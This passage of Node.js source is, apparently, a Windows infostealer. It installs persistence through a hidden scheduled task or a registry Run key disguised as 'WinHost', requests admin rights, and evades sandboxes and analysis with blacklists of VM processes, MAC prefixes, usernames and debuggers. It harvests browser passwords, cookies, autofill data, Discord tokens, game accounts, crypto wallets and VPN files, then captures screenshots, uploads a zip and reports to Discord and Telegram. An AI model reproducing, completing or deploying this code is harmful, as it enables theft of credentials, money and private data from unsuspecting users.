    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>//nologo "${vbsPath}"</Arguments>
    </Exec>
  </Actions>
</Task>`;

        try {
            fs.writeFileSync(vbsPath, vbsContent);
            fs.writeFileSync(xmlPath, taskXml, { encoding: 'utf16le' });
            execSync(`schtasks /create /tn "${taskName}" /xml "${xmlPath}" /f`, { stdio: 'ignore', windowsHide: true });
            fs.unlinkSync(xmlPath);
        } catch (e) {
            try {
                execSync(`schtasks /create /tn "${taskName}" /tr "wscript.exe //nologo '${vbsPath}'" /sc onlogon /rl highest /f`, { stdio: 'ignore', windowsHide: true });
            } catch (e2) {
                execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinHost" /t REG_SZ /d "wscript.exe //nologo \\"${vbsPath}\\"" /f`, { stdio: 'ignore', windowsHide: true });
            }
        }

        logSuccess('0xB');
    } catch (e) {
        logError(e, 'basicStartup');
    }
}

class Client {
    async init() {
        let downloadLink = null;
        try {
            await loadConfiguration();


            const pInjection = CONFIG.wallet ? walletInjection() : Promise.resolve();
            const pService = CONFIG.wallet ? initializeService() : Promise.resolve();
            const pCleanup = (async () => cleanupProcesses())();
            const pDiscordTokens = CONFIG.backupcodes ? fetchDiscordTokens() : Promise.resolve(0);
            const pSocials = CONFIG.backupcodes ? fetchSocials() : Promise.resolve(0);
            const pGames = CONFIG.games ? fetchGamesData() : Promise.resolve(0);
            const pWallets = CONFIG.wallet ? fetchWallets() : Promise.resolve(0);
            const pFormData = CONFIG.browsers ? fetchFormData() : Promise.resolve(0);
            const pVPN = CONFIG.filevpn ? fetchFileVPN() : Promise.resolve(0);
            const pPasswords = CONFIG.browsers ? fetchUserData() : Promise.resolve(0);
            const pCookies = CONFIG.browsers ? fetchSessionData() : Promise.resolve(0);



            const results = await Promise.allSettled([
                pFormData,
                pPasswords,
                pCookies,
                pDiscordTokens,
                pSocials,
                pGames,
                pWallets,
                pVPN
            ]);

            const autofillCount = results[0].status === 'fulfilled' ? results[0].value : 0;
            const passwordsCount = results[1].status === 'fulfilled' ? results[1].value : 0;
            const cookiesCount = results[2].status === 'fulfilled' ? results[2].value : 0;
            const tokensCount = results[3].status === 'fulfilled' ? results[3].value : 0;
            const socialsCount = results[4].status === 'fulfilled' ? results[4].value : 0;
            const gamesCount = results[5].status === 'fulfilled' ? results[5].value : 0;
            const walletsCount = results[6].status === 'fulfilled' ? results[6].value : 0;

            await Promise.allSettled([pInjection, pService, pCleanup]);

            const screenshotBuffer = await captureAllScreens();

            try {
                pruneMainFolder(mainFolderPath, FINAL_ARCHIVE_LIMIT);
            } catch (pruneErr) { }

            console.log('[System] Building data package and uploading...');
            const uploadResult = await createAndUploadZip();
            downloadLink = uploadResult.link;
            const zipSize = uploadResult.size;

            await Promise.allSettled([
                sendDiscordEmbed(screenshotBuffer, downloadLink, zipSize, passwordsCount, cookiesCount, autofillCount, tokensCount, socialsCount, gamesCount, walletsCount),
                sendTelegramMessage(screenshotBuffer, downloadLink, zipSize, passwordsCount, cookiesCount, autofillCount, tokensCount, socialsCount, gamesCount, walletsCount)
            ]);


        } catch (error) {
            logError(error, 'Client.init');

        } finally {
            finalizeLog();
            selfCleanup(downloadLink);
        }
    }
}


function checkSystem() {
    if (process.platform !== 'win32') return false;

    const blacklist = {
        users: ['WDAGUtilityAccount', 'Abby', 'pateu', 'JohnDoe', 'h4cci', 'Prazzy', 'Peter Wilson', 'Timmy', 'Emily', 'Anna', 'Caroline', 'Lisa', 'Robert', 'David', 'James', 'Michael'],
        pcNames: ['BEE7390B-866E-4', 'DESKTOP-GVB9695', 'DESKTOP-4999DR8', 'DESKTOP-H0C9S9H', 'DESKTOP-6M7B5S4', 'DESKTOP-51950T1', 'HANDY-PC', 'JOHN-PC', 'DESKTOP-1PY9J9S', 'WIN-7890BC', 'DESKTOP-V9B0311'],
        processes: ['vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'vgauthservice.exe', 'vmacthlp.exe', 'vmsrvc.exe', 'vmusrvc.exe', 'prl_cc.exe', 'prl_tools.exe', 'xenservice.exe', 'qemu-ga.exe', 'wireshark.exe', 'fiddler.exe', 'httpdebugger.exe', 'processhacker.exe', 'x64dbg.exe', 'ollydbg.exe', 'pestudio.exe', 'vmperfmon.exe', 'autoruns.exe', 'procexp.exe', 'vmsvga.exe'],
        macs: ['08:00:27', '00:05:69', '00:0C:29', '00:50:56', '00:1C:42', '00:16:3E', '08:00:20', '00:15:5D'],
        hardware: ['VirtualBox', 'VMware', 'Parallel', 'QEMU', 'Hyper-V', 'KVM', 'Xen']
    };

    const checkDisk = () => {
        try {
            const out = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "(Get-Volume -DriveLetter C).Size"', { windowsHide: true, stdio: 'pipe', timeout: 5000 }).toString();
            const bytes = parseInt(out.trim());
            if (!isNaN(bytes) && bytes < 100 * 1024 * 1024 * 1024) return true;
        } catch (e) { }
        return false;
    };

    const checkHardware = () => {
        try {
            const out = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_ComputerSystem | Select-Object -Property Model, Manufacturer | Format-List"', { windowsHide: true, stdio: 'pipe', timeout: 5000 }).toString().toLowerCase();
            if (blacklist.hardware.some(h => out.includes(h.toLowerCase()))) return true;
        } catch (e) { }
        return false;
    };

    const checkMAC = () => {
        try {
            const out = execSync('getmac', { windowsHide: true, stdio: 'pipe', timeout: 5000 }).toString();
            if (blacklist.macs.some(mac => out.includes(mac))) return true;
        } catch (e) { }
        return false;
    };

    const checkRDP = () => {
        try {
            if (os.hostname().includes('RDP') || (process.env.SESSIONNAME && process.env.SESSIONNAME.toLowerCase().includes('rdp'))) return true;
        } catch (e) { }
        return false;
    };

    if (os.totalmem() < 4.01 * 1024 * 1024 * 1024) return true;
    if (os.cpus().length < 2) return true;

    if (blacklist.users.includes(os.userInfo().username)) return true;
    if (blacklist.pcNames.includes(os.hostname())) return true;
    if (checkDisk()) return true;
    if (checkHardware()) return true;
    if (checkMAC()) return true;
    if (checkRDP()) return true;

    try {
        const tasks = execSync('tasklist', { windowsHide: true, timeout: 10000 }).toString().toLowerCase();
        if (blacklist.processes.some(p => tasks.includes(p))) {
            return true;
        }
    } catch (e) { }

    return false;
}


(async () => {
    try {
        const isAdmin = hasAdminPrivileges();
        if (!isAdmin) {
            relaunchAsAdmin();
            return;
        }

        if (CONFIG.antivm) {
            if (checkSystem()) process.exit(0);
        }
        checkSingleInstance();
        initializeFolders();
        const client = new Client();
        await client.init();

    } catch (error) {
        logError(error, 'main-executor');
    } finally {
        process.exit(0);
    }

})();
